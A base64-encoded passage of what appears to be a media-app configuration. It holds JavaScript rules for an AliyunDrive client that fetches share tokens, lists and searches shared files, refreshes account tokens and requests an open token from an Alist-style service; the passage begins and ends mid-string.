xcXFwiO1xcXFxuICAgIHRoaXMuc2lnbmlmaWNhbmNlID0gZXJyb3JUeXBlWzFdIHx8IHNpZ25pZmljYW5jZSB8fCAxO1xcXFxufVxcXFxuQWxpRXJyb3IuZXJyb3JDb2RlTWFwID0gbmV3IE1hcChbXFxcXG4gICAgW1xcXFxcXFwiU2hhcmVMaW5rLkNhbmNlbGxlZFxcXFxcXFwiLCBbXFxcXFxcXCLliIbkuqvpk77mjqXlt7LlpLHmlYhcXFxcXFxcIl1dLFxcXFxuICAgIFtcXFxcXFxcIlNoYXJlTGluay5Gb3JiaWRkZW5cXFxcXFxcIiwgW1xcXFxcXFwi6L+d6KeE6LWE5rqQ5bey6KKr5bCB56aBXFxcXFxcXCJdXSxcXFxcbiAgICBbXFxcXFxcXCJOb3RGb3VuZC5TaGFyZUxpbmtcXFxcXFxcIiwgW1xcXFxcXFwi5LiN5a2Y5Zyo6K+l6ZO+5o6l6K+35qC45a+5XFxcXFxcXCJdXSxcXFxcbiAgICBbXFxcXFxcXCJBY2Nlc3NUb2tlbkludmFsaWRcXFxcXFxcIiwgW1xcXFxcXFwi6K6/6Zeu5Luk54mM5aSx5pWI77yM6K+36YeN5paw55m76ZmGXFxcXFxcXCJdXSxcXFxcbiAgICBbXFxcXFxcXCJTaGFyZUxpbmtUb2tlbkludmFsaWRcXFxcXFxcIiwgW1xcXFxcXFwi5YiG5Lqr5Luk54mM5aSx5pWIXFxcXFxcXCJdXSxcXFxcbiAgICBbXFxcXFxcXCJQYXJhbUZsb3dFeGNlcHRpb25cXFxcXFxcIiwgW1xcXFxcXFwi6K6/6Zeu6L+H5LqO6aKR57mB77yM6K+356iN5ZCO5YaN6K+VXFxcXFxcXCIsIDNdXVxcXFxuXSk7XFxcXG5cXFxcbkFsaUVycm9yLnByb3RvdHlwZSA9IE9iamVjdC5hc3NpZ24obmV3IEVycm9yKCksIHtcXFxcbiAgICBjb25zdHJ1Y3RvcjogQWxpRXJyb3JcXFxcbn0pO1xcXFxuXFxcXG5mdW5jdGlvbiBwb3N0QXBpKGFwaSwgYm9keSwgaGVhZGVycykge1xcXFxuICAgIGxldCByZXN1bHQgPSByZXF1ZXN0KCdodHRwczovL2FwaS5hbGl5dW5kcml2ZS5jb20nICsgYXBpLCB7XFxcXG4gICAgICAgIGhlYWRlcnM6IE9iamVjdC5hc3NpZ24oe1xcXFxuICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJyxcXFxcbiAgICAgICAgfSwgaGVhZGVycyksXFxcXG4gICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KGJvZHkpLFxcXFxuICAgICAgICBtZXRob2Q6ICdQT1NUJ1xcXFxuICAgIH0pO1xcXFxuICAgIHJlc3VsdCA9IEpTT04ucGFyc2UocmVzdWx0KTtcXFxcbiAgICBpZiAocmVzdWx0LmNvZGUpIHtcXFxcbiAgICAgICAgdGhyb3cgbmV3IEFsaUVycm9yKHJlc3VsdC5jb2RlLCByZXN1bHQubWVzc2FnZSk7XFxcXG4gICAgfVxcXFxuICAgIHJldHVybiByZXN1bHQ7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIEFsaVNoYXJlQXBpKHNoYXJlSWQsIHNoYXJlUHdkLCBzaGFyZVRva2VuLCByZWZyZXNoQ2FsbEJhY2spIHtcXFxcbiAgICB0aGlzLnNoYXJlSWQgPSBzaGFyZUlkO1xcXFxuICAgIHRoaXMuc2hhcmVQd2QgPSBzaGFyZVB3ZDtcXFxcbiAgICB0aGlzLnJlZnJlc2hDYWxsQmFjayA9IHJlZnJlc2hDYWxsQmFjayB8fCAoKCkgPT4gdm9pZCAwKTtcXFxcbiAgICB0aGlzLnNoYXJlVG9rZW4gPSBzaGFyZVRva2VuIHx8IHRoaXMuZ2V0U2hhcmVUb2tlbigpO1xcXFxufVxcXFxuT2JqZWN0LmFzc2lnbihBbGlTaGFyZUFwaS5wcm90b3R5cGUsIHtcXFxcbiAgICBnZXRTaGFyZVRva2VuKCkge1xcXFxuICAgICAgICBsZXQgcmVzdWx0ID0gcG9zdEFwaShcXFxcXFxcIi92Mi9zaGFyZV9saW5rL2dldF9zaGFyZV90b2tlblxcXFxcXFwiLCB7XFxcXG4gICAgICAgICAgICBcXFxcXFxcInNoYXJlX2lkXFxcXFxcXCI6IHRoaXMuc2hhcmVJZCxcXFxcbiAgICAgICAgICAgIFxcXFxcXFwic2hhcmVfcHdkXFxcXFxcXCI6IHRoaXMuc2hhcmVQd2QsXFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICB0aGlzLnNoYXJlVG9rZW4gPSByZXN1bHQuc2hhcmVfdG9rZW47XFxcXG4gICAgICAgIHRoaXMucmVmcmVzaENhbGxCYWNrKHJlc3VsdC5zaGFyZV90b2tlbiwgdGhpcyk7XFxcXG4gICAgICAgIHJldHVybiByZXN1bHQuc2hhcmVfdG9rZW47XFxcXG4gICAgfSxcXFxcbiAgICBwb3N0VG9rZW5BcGkoYXBpLCBib2R5LCBoZWFkZXJzLCBpc1JldHJ5KSB7XFxcXG4gICAgICAgIGxldCByZXN1bHQ7XFxcXG4gICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICByZXN1bHQgPSBwb3N0QXBpKGFwaSwgYm9keSwgT2JqZWN0LmFzc2lnbih7XFxcXG4gICAgICAgICAgICAgICAgXFxcXFxcXCJYLVNoYXJlLVRva2VuXFxcXFxcXCI6IHRoaXMuc2hhcmVUb2tlbiB8fCB0aGlzLmdldFNoYXJlVG9rZW4oKVxcXFxuICAgICAgICAgICAgfSwgaGVhZGVycykpO1xcXFxuICAgICAgICB9IGNhdGNoIChlKSB7XFxcXG4gICAgICAgICAgICBpZiAoKGUuY29kZSA9PT0gXFxcXFxcXCJBY2Nlc3NUb2tlbkludmFsaWRcXFxcXFxcIiB8fCBlLmNvZGUgPT09IFxcXFxcXFwiU2hhcmVMaW5rVG9rZW5JbnZhbGlkXFxcXFxcXCIpICYmICFpc1JldHJ5KSB7XFxcXG4gICAgICAgICAgICAgICAgdGhpcy5nZXRTaGFyZVRva2VuKCk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIHRoaXMucG9zdFRva2VuQXBpKGFwaSwgYm9keSwgaGVhZGVycywgdHJ1ZSk7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB0aHJvdyBlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiByZXN1bHQ7XFxcXG4gICAgfSxcXFxcbiAgICBnZXRMaXN0RmlsZShmaWxlSWQsIG1hcmtlciwgb3JkZXJCeSwgb3JkZXJEaXJlY3Rpb24pIHtcXFxcbiAgICAgICAgbGV0IHJlc3VsdCA9IHRoaXMucG9zdFRva2VuQXBpKFxcXFxcXFwiL2Fkcml2ZS92My9maWxlL2xpc3RcXFxcXFxcIiwge1xcXFxuICAgICAgICAgICAgXFxcXFxcXCJzaGFyZV9pZFxcXFxcXFwiOiB0aGlzLnNoYXJlSWQsXFxcXG4gICAgICAgICAgICBcXFxcXFxcInBhcmVudF9maWxlX2lkXFxcXFxcXCI6IGZpbGVJZCB8fCBcXFxcXFxcInJvb3RcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIFxcXFxcXFwibGltaXRcXFxcXFxcIjogMTAwLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJpbWFnZV90aHVtYm5haWxfcHJvY2Vzc1xcXFxcXFwiOiBcXFxcXFxcImltYWdlL3Jlc2l6ZSx3XzE2MC9mb3JtYXQsanBlZ1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJpbWFnZV91cmxfcHJvY2Vzc1xcXFxcXFwiOiBcXFxcXFxcImltYWdlXFxcXFxcXFwvcmVzaXplLHdfMTkyMC9mb3JtYXQsanBlZ1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJ2aWRlb190aHVtYm5haWxfcHJvY2Vzc1xcXFxcXFwiOiBcXFxcXFxcInZpZGVvL3NuYXBzaG90LHRfMTAwMCxmX2pwZyxhcl9hdXRvLHdfMzAwXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBcXFxcXFxcIm9yZGVyX2J5XFxcXFxcXCI6IG9yZGVyQnkgfHwgXFxcXFxcXCJuYW1lXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBcXFxcXFxcIm9yZGVyX2RpcmVjdGlvblxcXFxcXFwiOiBvcmRlckRpcmVjdGlvbiB8fCBcXFxcXFxcIkFTQ1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJtYXJrZXJcXFxcXFxcIjogbWFya2VyXFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICByZXR1cm4gcmVzdWx0O1xcXFxuICAgIH0sXFxcXG4gICAgZ2V0U2hhcmVJbmZvKCkge1xcXFxuICAgICAgICBsZXQgcmVzdWx0ID0gcG9zdEFwaShcXFxcXFxcIi9hZHJpdmUvdjMvc2hhcmVfbGluay9nZXRfc2hhcmVfYnlfYW5vbnltb3VzP3NoYXJlX2lkPVxcXFxcXFwiICsgdGhpcy5zaGFyZUlkLCB7XFxcXG4gICAgICAgICAgICBcXFxcXFxcInNoYXJlX2lkXFxcXFxcXCI6IHRoaXMuc2hhcmVJZFxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcXFxcbiAgICB9LFxcXFxuICAgIGdldFNlYXJjaExpc3RGaWxlKGtleSwgbWFya2VyLCBvcmRlckJ5LCBvcmRlckRpcmVjdGlvbikge1xcXFxuICAgICAgICBsZXQgcmVzdWx0ID0gdGhpcy5wb3N0VG9rZW5BcGkoXFxcXFxcXCIvcmVjb21tZW5kL3YxL3NoYXJlTGluay9zZWFyY2hcXFxcXFxcIiwge1xcXFxuICAgICAgICAgICAgXFxcXFxcXCJzaGFyZV9pZFxcXFxcXFwiOiB0aGlzLnNoYXJlSWQsXFxcXG4gICAgICAgICAgICBcXFxcXFxcImtleXdvcmRcXFxcXFxcIjoga2V5LFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJsaW1pdFxcXFxcXFwiOiAxMDAsXFxcXG4gICAgICAgICAgICBcXFxcXFxcIm9yZGVyX2J5XFxcXFxcXCI6IG9yZGVyQnkgKyBcXFxcXFxcIiBcXFxcXFxcIiArIG9yZGVyRGlyZWN0aW9uLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJtYXJrZXJcXFxcXFxcIjogbWFya2VyIHx8IHVuZGVmaW5lZFxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgaWYgKE9iamVjdC5rZXlzKHJlc3VsdCkubGVuZ3RoID09PSAwKSB7XFxcXG4gICAgICAgICAgICByZXN1bHQuaXRlbXMgPSBbXTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXR1cm4gcmVzdWx0O1xcXFxuICAgIH1cXFxcbn0pO1xcXFxuJC5leHBvcnRzID0gQWxpU2hhcmVBcGk7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi6Zi/6YeM5pKt5pS+QVBJXFxcIixcXFwicGF0aFxcXCI6XFxcImFsaVBsYXlBcGlcXFwiLFxcXCJydWxlXFxcIjpcXFwiLy9AYXV0aG9yIExveURnSWtcXFxcbmZ1bmN0aW9uIHBvc3RBcGkoYXBpLCBib2R5LCBoZWFkZXJzLCBhZ2FpblRyeSwgdHJ5RnJlKSB7XFxcXG4gICAgbGV0IHJlc3VsdDtcXFxcbiAgICB0cnkge1xcXFxuICAgICAgICByZXN1bHQgPSByZXF1ZXN0KGFwaS5zdGFydHNXaXRoKFxcXFxcXFwiaHR0cFxcXFxcXFwiKSA/IGFwaSA6ICdodHRwczovL2FwaS5hbGl5dW5kcml2ZS5jb20nICsgYXBpLCB7XFxcXG4gICAgICAgICAgICBoZWFkZXJzOiBPYmplY3QuYXNzaWduKHtcXFxcbiAgICAgICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxcXFxuICAgICAgICAgICAgfSwgaGVhZGVycyksXFxcXG4gICAgICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeShib2R5KSxcXFxcbiAgICAgICAgICAgIG1ldGhvZDogJ1BPU1QnXFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICByZXN1bHQgPSBKU09OLnBhcnNlKHJlc3VsdCk7XFxcXG4gICAgICAgIGlmIChyZXN1bHQuY29kZSkge1xcXFxuICAgICAgICAgICAgbGV0IG1zZz1yZXN1bHQuZGlzcGxheV9tZXNzYWdlIHx8IHJlc3VsdC5tZXNzYWdlO1xcXFxuICAgICAgICAgICAgbGV0IGVycm9yID0gbmV3IEVycm9yKGFwaSArIFxcXFxcXFwiPT5cXFxcXFxcIiArIHJlc3VsdC5jb2RlICsgXFxcXFxcXCI6XFxcXFxcXCIgKyBtc2cpO1xcXFxuICAgICAgICAgICAgZXJyb3IuY29kZSA9IHJlc3VsdC5jb2RlO1xcXFxuICAgICAgICAgICAgZXJyb3IuanVkZ2VNc2c9bXNnXFxcXG4gICAgICAgICAgICB0aHJvdyBlcnJvcjtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBsZXQgcmJvZHkgPSByZXN1bHQgJiYgcmVzdWx0LnJlc3BvbnNlcyAmJiByZXN1bHQucmVzcG9uc2VzWzBdICYmIHJlc3VsdC5yZXNwb25zZXNbMF0uYm9keSB8fCB7fTtcXFxcbiAgICAgICAgaWYgKHJib2R5LmNvZGUpIHtcXFxcbiAgICAgICAgICAgIGxldCBtc2cgPXJib2R5LmRpc3BsYXlfbWVzc2FnZSB8fCByYm9keS5tZXNzYWdlO1xcXFxuICAgICAgICAgICAgbGV0IGVycm9yID0gbmV3IEVycm9yKGFwaSArIFxcXFxcXFwiPT5cXFxcXFxcIiArIHJib2R5LmNvZGUgKyBcXFxcXFxcIjpcXFxcXFxcIiArIG1zZyk7XFxcXG4gICAgICAgICAgICBlcnJvci5jb2RlID0gcmJvZHkuY29kZTtcXFxcbiAgICAgICAgICAgIGVycm9yLmp1ZGdlTXNnPW1zZztcXFxcbiAgICAgICAgICAgIHRocm93IGVycm9yO1xcXFxuICAgICAgICB9XFxcXG4gICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICB0cnlGcmUgPSB0cnlGcmUgPT09IHVuZGVmaW5lZCA/IDEgOiB0cnlGcmU7XFxcXG4gICAgICAgIGlmIChhZ2FpblRyeSAmJiB0cnlGcmUgPiAwKSB7XFxcXG4gICAgICAgICAgICBpZiAodHlwZW9mIGFnYWluVHJ5ID09PSBcXFxcXFxcImZ1bmN0aW9uXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgbmV3RGF0YSA9IGFnYWluVHJ5KGUsIHJlc3VsdCwgYm9keSwgaGVhZGVycywgdHJ5RnJlKTtcXFxcbiAgICAgICAgICAgICAgICBpZiAobmV3RGF0YSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBPYmplY3QuYXNzaWduKGJvZHksIG5ld0RhdGEuYm9keSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIE9iamVjdC5hc3NpZ24oaGVhZGVycywgbmV3RGF0YS5oZWFkZXJzKTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICByZXR1cm4gcG9zdEFwaShhcGksIGJvZHksIGhlYWRlcnMsIGFnYWluVHJ5LCB0cnlGcmUgLSAxKTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICB0aHJvdyBlO1xcXFxuICAgIH1cXFxcbiAgICByZXR1cm4gcmVzdWx0O1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBBbGlBY2Nlc3NBcGkoc2hhcmVJZCwgc2hhcmVQd2QsIHNoYXJlVG9rZW4sIGFsaVRva2Vucywgb3BlblRva2VucywgcmVmcmVzaFNoYXJlQ2FsbEJhY2ssIHJlZnJlc2hBY2Nlc3NDYWxsQmFjaywgcmVmcmVzaE9wZW5DYWxsQmFjaykge1xcXFxuICAgIHRoaXMuc2hhcmVJZCA9IHNoYXJlSWQ7XFxcXG4gICAgdGhpcy5zaGFyZVB3ZCA9IHNoYXJlUHdkO1xcXFxuICAgIHRoaXMucmVmcmVzaFNoYXJlQ2FsbEJhY2sgPSByZWZyZXNoU2hhcmVDYWxsQmFjayB8fCAoKCkgPT4gdm9pZCAwKTtcXFxcbiAgICB0aGlzLnJlZnJlc2hBY2Nlc3NDYWxsQmFjayA9IHJlZnJlc2hBY2Nlc3NDYWxsQmFjayB8fCAoKCkgPT4gdm9pZCAwKTtcXFxcbiAgICB0aGlzLnJlZnJlc2hPcGVuQ2FsbEJhY2sgPSByZWZyZXNoT3BlbkNhbGxCYWNrIHx8ICgoKSA9PiB2b2lkIDApO1xcXFxuICAgIHRoaXMuc2hhcmVUb2tlbiA9IHNoYXJlVG9rZW4gfHwgdGhpcy5nZXRTaGFyZVRva2VuKCk7XFxcXG4gICAgdGhpcy5hbGlUb2tlbnMgPSBhbGlUb2tlbnMgfHwge307XFxcXG4gICAgaWYgKCF0aGlzLmFsaVRva2Vucy5yZWZyZXNoX3Rva2VuKSB7XFxcXG4gICAgICAgIHRocm93IG5ldyBFcnJvcihcXFxcXFxcIuacqueZu+mZhlxcXFxcXFwiKTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKCF0aGlzLmFsaVRva2Vucy5hY2Nlc3NfdG9rZW4pIHtcXFxcbiAgICAgICAgdGhpcy5yZWZyZXNoQWNjZXNzVG9rZW4oKTtcXFxcbiAgICB9XFxcXG4gICAgdGhpcy5kZWZEcml2ZUlkID0gdGhpcy5hbGlUb2tlbnMucmVzb3VyY2VfZHJpdmVfaWQgfHwgdGhpcy5hbGlUb2tlbnMuZGVmYXVsdF9kcml2ZV9pZDtcXFxcbiAgICB0aGlzLnJlYWNjZXNzVGsgPSAodGhpcy5hbGlUb2tlbnMudG9rZW5fdHlwZSB8fCBcXFxcXFxcIkJlYXJlclxcXFxcXFwiKSArICcgJyArIHRoaXMuYWxpVG9rZW5zLmFjY2Vzc190b2tlbjtcXFxcbiAgICB0aGlzLm9wZW5Ub2tlbnMgPSBvcGVuVG9rZW5zIHx8IHtcXFxcbiAgICAgICAgJ1JlZnJlc2hUb2tlbk9wZW4nOiAnJyxcXFxcbiAgICAgICAgJ0FjY2Vzc1Rva2VuT3Blbic6ICcnLFxcXFxuICAgICAgICAnQmluZFJlZnJlc2hUb2tlbic6ICcnLFxcXFxuICAgIH07XFxcXG4gICAgaWYgKG9wZW5Ub2tlbnMgIT09IG51bGwgJiYgIXRoaXMub3BlblRva2Vucy5BY2Nlc3NUb2tlbk9wZW4pIHtcXFxcbiAgICAgICAgdGhpcy5yZWZyZXNoT3BlblRva2VuKCk7XFxcXG4gICAgfVxcXFxufVxcXFxuT2JqZWN0LmFzc2lnbihBbGlBY2Nlc3NBcGkucHJvdG90eXBlLCB7XFxcXG4gICAgd2FpdFNsZWVwKHRpbWUpIHtcXFxcbiAgICAgICAgamF2YS5sYW5nLlRocmVhZC5zbGVlcCh0aW1lIHx8IDYwMCk7XFxcXG4gICAgICAgIHJldHVybiB0aGlzO1xcXFxuICAgIH0sXFxcXG4gICAgdHJ5U29sdmUoZSkge1xcXFxuICAgICAgICBpZiAoZS5jb2RlID09PSBcXFxcXFxcIlNoYXJlTGlua1Rva2VuSW52YWxpZFxcXFxcXFwiIHx8IGUuY29kZSA9PT0gXFxcXFxcXCJJbnZhbGlkUGFyYW1ldGVyTm90TWF0Y2guU2hhcmVJZFxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICB0aGlzLndhaXRTbGVlcCgyMCkuZ2V0U2hhcmVUb2tlbigpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIHRydWU7XFxcXG4gICAgICAgIH0gZWxzZSBpZiAoZS5jb2RlID09PSBcXFxcXFxcIkFjY2Vzc1Rva2VuSW52YWxpZFxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICB0aGlzLndhaXRTbGVlcCgyMCkucmVmcmVzaEFjY2Vzc1Rva2VuKCk7XFxcXG4gICAgICAgICAgICByZXR1cm4gdHJ1ZTtcXFxcbiAgICAgICAgfSBlbHNlIGlmIChlLmNvZGUgPT09IFxcXFxcXFwiRm9yYmlkZGVuTm9QZXJtaXNzaW9uLkZpbGVcXFxcXFxcIiB8fCAoZS5jb2RlID09PSBcXFxcXFxcIkJhZFJlcXVlc3RcXFxcXFxcIiYmZS5qdWRnZU1zZz09PVxcXFxcXFwi5LuF5Y+v5L+d5a2Y5Yiw6L2s5a2Y56m66Ze0XFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICB0aGlzLmFsaVRva2Vucy5yZXNvdXJjZV9kcml2ZV9pZCA9IHVuZGVmaW5lZDtcXFxcbiAgICAgICAgICAgIHRoaXMud2FpdFNsZWVwKDIwKS5yZWZyZXNoQWNjZXNzVG9rZW4oKTtcXFxcbiAgICAgICAgICAgIHJldHVybiB0cnVlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHJldHVybiBmYWxzZTtcXFxcbiAgICB9LFxcXFxuICAgIGdldFNoYXJlVG9rZW4oKSB7XFxcXG4gICAgICAgIGxldCByZXN1bHQgPSBwb3N0QXBpKFxcXFxcXFwiL3YyL3NoYXJlX2xpbmsvZ2V0X3NoYXJlX3Rva2VuXFxcXFxcXCIsIHtcXFxcbiAgICAgICAgICAgIFxcXFxcXFwic2hhcmVfaWRcXFxcXFxcIjogdGhpcy5zaGFyZUlkLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJzaGFyZV9wd2RcXFxcXFxcIjogdGhpcy5zaGFyZVB3ZCxcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIHRoaXMuc2hhcmVUb2tlbiA9IHJlc3VsdC5zaGFyZV90b2tlbjtcXFxcbiAgICAgICAgdGhpcy5yZWZyZXNoU2hhcmVDYWxsQmFjayhyZXN1bHQuc2hhcmVfdG9rZW4sIHRoaXMpO1xcXFxuICAgICAgICByZXR1cm4gcmVzdWx0LnNoYXJlX3Rva2VuO1xcXFxuICAgIH0sXFxcXG4gICAgcmVmcmVzaEFjY2Vzc1Rva2VuKCkge1xcXFxuICAgICAgICBsZXQgcmVzdWx0ID0gcG9zdEFwaShcXFxcXFxcImh0dHBzOi8vYXV0aC5hbGl5dW5kcml2ZS5jb20vdjIvYWNjb3VudC90b2tlblxcXFxcXFwiLCB7XFxcXG4gICAgICAgICAgICBcXFxcXFxcImdyYW50X3R5cGVcXFxcXFxcIjogXFxcXFxcXCJyZWZyZXNoX3Rva2VuXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBcXFxcXFxcInJlZnJlc2hfdG9rZW5cXFxcXFxcIjogdGhpcy5hbGlUb2tlbnMucmVmcmVzaF90b2tlbixcXFxcbiAgICAgICAgfSwge1xcXFxuICAgICAgICAgICAgXFxcXFxcXCJVc2VyLUFnZW50XFxcXFxcXCI6IFBDX1VBLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJSZWZlcmVyXFxcXFxcXCI6IFxcXFxcXFwiaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL1xcXFxcXFwiXFxcXG4gICAgICAgIH0sIChlKSA9PiB7XFxcXG4gICAgICAgICAgICBpZiAoZS5jb2RlID09PSBcXFxcXFxcIkludmFsaWRQYXJhbWV0ZXIuUmVmcmVzaFRva2VuXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICBlLm1lc3NhZ2UgPSBcXFxcXFxcIiPnmbvpmYbov4fmnJ/or7fph43mlrDnmbvpmYYjXFxcXFxcXFxuXFxcXFxcXCIgKyBlLm1lc3NhZ2U7XFxcXG4gICAgICAgICAgICAgICAgdGhyb3cgZTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIGRlbGV0ZSByZXN1bHQudXNlcl9kYXRhO1xcXFxuICAgICAgICBsZXQgb3JpZ2luRGVmZERyaXZlSWQgPSB0aGlzLmFsaVRva2Vucy5kZWZhdWx0X2RyaXZlX2lkO1xcXFxuICAgICAgICB0aGlzLmFsaVRva2VucyA9IE9iamVjdC5hc3NpZ24odGhpcy5hbGlUb2tlbnMsIHJlc3VsdCk7XFxcXG4gICAgICAgIHRoaXMucmVhY2Nlc3NUayA9IHRoaXMuYWxpVG9rZW5zLnRva2VuX3R5cGUgKyAnICcgKyB0aGlzLmFsaVRva2Vucy5hY2Nlc3NfdG9rZW47XFxcXG4gICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICBpZiAoKG9yaWdpbkRlZmREcml2ZUlkICE9PSB0aGlzLmFsaVRva2Vucy5kZWZhdWx0X2RyaXZlX2lkKSB8fCB0aGlzLmFsaVRva2Vucy5yZXNvdXJjZV9kcml2ZV9pZD09PXVuZGVmaW5lZCkge1xcXFxuICAgICAgICAgICAgICAgIGxldCByZXNvdXJjZV9kcml2ZV9pZCA9IHRoaXMuZ2V0VXNlckluZm8oKS5yZXNvdXJjZV9kcml2ZV9pZDtcXFxcbiAgICAgICAgICAgICAgICB0aGlzLmFsaVRva2Vucy5yZXNvdXJjZV9kcml2ZV9pZCA9IHJlc291cmNlX2RyaXZlX2lkO1xcXFxuICAgICAgICAgICAgICAgIGlmIChyZXNvdXJjZV9kcml2ZV9pZCkge1xcXFxuICAgICAgICAgICAgICAgICAgICB0aGlzLmRlZkRyaXZlSWQgPSByZXNvdXJjZV9kcml2ZV9pZDtcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICB0aGlzLmRlZkRyaXZlSWQgPSB0aGlzLmFsaVRva2Vucy5kZWZhdWx0X2RyaXZlX2lkO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICAgICAgbG9nKFxcXFxcXFwi55So5oi35L+h5oGv6I635Y+W5aSx6LSl77yaXFxcXFxcXCIgKyBlLnRvU3RyaW5nKCkpO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHRoaXMucmVmcmVzaEFjY2Vzc0NhbGxCYWNrKHJlc3VsdCwgdGhpcyk7XFxcXG4gICAgICAgIHJldHVybiB0aGlzLmFsaVRva2VucztcXFxcbiAgICB9LFxcXFxuICAgIGdldFVzZXJJbmZvKCkge1xcXFxuICAgICAgICBsZXQgaW5mbyA9IHBvc3RBcGkoXFxcXFxcXCJodHRwczovL3VzZXIuYWxpeXVuZHJpdmUuY29tL3YyL3VzZXIvZ2V0XFxcXFxcXCIsIHt9LCB7XFxcXG4gICAgICAgICAgICBcXFxcXFxcIlVzZXItQWdlbnRcXFxcXFxcIjogUENfVUEsXFxcXG4gICAgICAgICAgICBcXFxcXFxcImF1dGhvcml6YXRpb25cXFxcXFxcIjogdGhpcy5yZWFjY2Vzc1RrLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCJSZWZlcmVyXFxcXFxcXCI6IFxcXFxcXFwiaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL1xcXFxcXFwiXFxcXG4gICAgICAgIH0sIChlKSA9PiB7XFxcXG4gICAgICAgICAgICB0aGlzLnRyeVNvbHZlKGUpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICdhdXRob3JpemF0aW9uJzogdGhpcy5yZWFjY2Vzc1RrXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgcmV0dXJuIGluZm87XFxcXG4gICAgfSxcXFxcbiAgICBfZ2V0T3BlblRva2VuKGNvZGUpIHtcXFxcbiAgICAgICAgbGV0IGJvZHkgPSB7fSxcXFxcbiAgICAgICAgICAgIGhlYWRlcnMgPSB7XFxcXG4gICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiBQQ19VQSxcXFxcbiAgICAgICAgICAgICAgICAnUmVmZXJlcic6ICdodHRwczovL3d3dy5hbGl5dW5kcml2ZS5jb20vJ1xcXFxuICAgICAgICAgICAgfTtcXFxcbiAgICAgICAgaWYgKGNvZGUpIHtcXFxcbiAgICAgICAgICAgIGJvZHkgPSB7XFxcXG4gICAgICAgICAgICAgICAgY29kZTogY29kZSxcXFxcbiAgICAgICAgICAgICAgICBncmFudF90eXBlOiBcXFxcXFxcImF1dGhvcml6YXRpb25fY29kZVxcXFxcXFwiXFxcXG4gICAgICAgICAgICB9O1xcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgYm9keSA9IHtcXFxcbiAgICAgICAgICAgICAgICBncmFudF90eXBlOiBcXFxcXFxcInJlZnJlc2hfdG9rZW5cXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoX3Rva2VuOiB0aGlzLm9wZW5Ub2tlbnMuUmVmcmVzaFRva2VuT3BlbixcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBsZXQganNvbiA9IHBvc3QoJ2h0dHBzOi8vYXBpLnhob2ZlLnRvcC9hbGlzdC9hbGlfb3Blbi9jb2RlJywge1xcXFxuICAgICAgICAgICAgaGVhZGVyczogaGVhZGVycyxcXFxcbiAgICAgICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KGJvZHk